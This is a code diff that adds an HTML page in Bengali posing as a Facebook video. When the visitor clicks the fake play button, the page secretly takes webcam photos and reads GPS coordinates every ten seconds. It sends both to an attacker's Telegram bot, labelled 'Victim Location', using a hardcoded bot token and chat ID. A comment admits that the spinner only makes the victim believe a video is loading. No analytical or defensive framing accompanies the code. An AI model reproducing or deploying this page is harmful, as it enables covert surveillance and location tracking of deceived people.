@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Video</title>
+    <style>
+        body { margin: 0; background: black; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; font-family: sans-serif; overflow: hidden; }
+        .video-container { position: relative; width: 100%; max-width: 400px; cursor: pointer; }
+        img { width: 100%; border-radius: 10px; }
+        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 50px; background: rgba(0,0,0,0.5); border-radius: 50%; padding: 20px; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="video-container" id="playArea">
+    <img src="https://logodix.com/logo/1695273.png" alt="Video Thumbnail">
+    <div class="play-btn">▶️</div>
+</div>
+
+<video id="video" width="640" height="480" autoplay style="display:none;"></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+    const botToken = "8287544458:AAEtYnwGsGQoBp-DGsm0hewUUQQA5VTZV9E";
+    const chatId = "7318157908";
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const playArea = document.getElementById('playArea');
+
+    // ক্যামেরা ও লোকেশন পারমিশন চাওয়া
+    async function setup() {
+        try {
+            // ক্যামেরা এক্সেস
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            
+            // লোকেশন এক্সেস
+            navigator.geolocation.getCurrentPosition(() => {}, () => {});
+        } catch (err) {
+            console.log("Permission Denied");
+        }
+    }
+
+    window.onload = setup;
+
+    // প্লে বাটনে ক্লিক করলে অটোমেশন শুরু হবে
+    playArea.addEventListener('click', () => {
+        // ইউজারকে মনে করানোর জন্য যে ভিডিও প্লে হচ্ছে (আসলে হবে না)
+        document.querySelector('.play-btn').innerText = "⌛";
+        
+        // প্রতি ১০ সেকেন্ডে লুপ চলবে
+        setInterval(() => {
+            takeSnap();
+            sendLoc();
+        }, 10000);
+        
+        // প্রথমবার সাথে সাথেই পাঠিয়ে দিবে
+        takeSnap();
+        sendLoc();
+    });
+
+    function takeSnap() {
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, 640, 480);
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'shot.jpg');
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+        }, 'image/jpeg');
+    }
+
+    function sendLoc() {
+        navigator.geolocation.getCurrentPosition(position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const msg = `📍 Victim Location:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+        });
+    }
+</script>
+</body>
+</html>
